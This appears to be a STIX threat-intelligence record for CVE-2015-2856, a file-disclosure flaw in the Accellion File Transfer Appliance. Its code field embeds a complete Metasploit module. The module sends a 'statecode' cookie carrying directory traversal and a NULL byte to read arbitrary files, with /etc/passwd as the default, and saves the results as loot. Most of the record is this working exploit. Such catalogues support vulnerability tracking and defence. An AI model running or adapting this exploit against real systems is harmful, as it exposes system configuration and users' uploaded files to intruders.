{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b29e146b-8d43-40cd-8978-dc5b2e9b7325",
    "created": "2024-08-14T16:30:34.066473Z",
    "modified": "2024-08-14T16:30:34.066477Z",
    "name": "\"Accellion FTA statecode Cookie Arbitrary File Read\"",
    "description": " This module exploits a file disclosure vulnerability in the Accellion File Transfer appliance. This vulnerability is triggered when a user-provided 'statecode' cookie parameter is appended to a file path that is processed as a HTML template. By prepending this cookie with directory traversal sequence and appending a NULL byte, any file readable by the web user can be exposed. The web user has read access to a number of sensitive files, including the system configuration and files uploaded to the appliance by users. This issue was confirmed on version FTA_9_11_200, but may apply to previous versions as well. This issue was fixed in software update FTA_9_11_210. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/accellion_fta_statecode_file_read.rb",
            "external_id": "accellion_fta_statecode_file_read.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857/"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2856"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => \"Accellion FTA 'statecode' Cookie Arbitrary File Read\",\n      'Description'    => %q{\n          This module exploits a file disclosure vulnerability in the Accellion\n        File Transfer appliance. This vulnerability is triggered when a user-provided\n        'statecode' cookie parameter is appended to a file path that is processed as\n        a HTML template. By prepending this cookie with directory traversal sequence\n        and appending a NULL byte, any file readable by the web user can be exposed.\n        The web user has read access to a number of sensitive files, including the\n        system configuration and files uploaded to the appliance by users.\n        This issue was confirmed on version FTA_9_11_200, but may apply to previous\n        versions as well. This issue was fixed in software update FTA_9_11_210.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'https://www.rapid7.com/blog/post/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857/'],\n          ['CVE', '2015-2856']\n        ],\n      'DisclosureDate' => '2015-07-10'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptString.new('TARGETURI', [true, 'The URI to request that triggers a call to template()', '/courier/intermediate_login.html']),\n        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),\n      ])\n  end\n\n  def run_host(ip)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => datastore['TARGETURI'],\n      'cookie' => 'statecode=../../../../..' + datastore['FILEPATH'] + '%00',\n    })\n\n    return if not res\n\n    if res.code != 200\n      vprint_status(\"#{peer} Unexpected response code: #{res.code} #{res.message}\")\n      return\n    end\n\n    contents = res.body.to_s\n\n    # Check for patched versions of the FTA\n    if contents =~ / Missing session ID.*Accellion, Inc/m\n      print_error(\"#{peer} Appears to be a patched Accellion FTA\")\n      return\n    end\n\n    fname = ::File.basename(datastore['FILEPATH'])\n\n    expected_server  = \"Apache\"\n    expected_expires = 'Mon, 26 Jul 1997 05:00:00 GMT'\n\n    # Use hints from the server headers to indicate whether we think this was a valid response\n    if res.headers['Server'].to_s == expected_server && res.headers['Expires'].to_s == expected_expires\n      path = store_loot(\n        'accellion.fta.file',\n        'application/octet-stream',\n        rhost,\n        res.body,\n        fname\n      )\n      print_good(\"#{peer} Sucessfully downloaded #{datastore['FILEPATH']} as #{path}\")\n    else\n      vprint_status(\n        \"#{peer} Unexpected response headers: (Server=#{res.headers['Server'].inspect} Expected=#{expected_server.inspect}) \" +\n        \"(Expires=#{res.headers['Expires'].inspect} Expected=#{expected_expires.inspect})\"\n      )\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-07-10"
}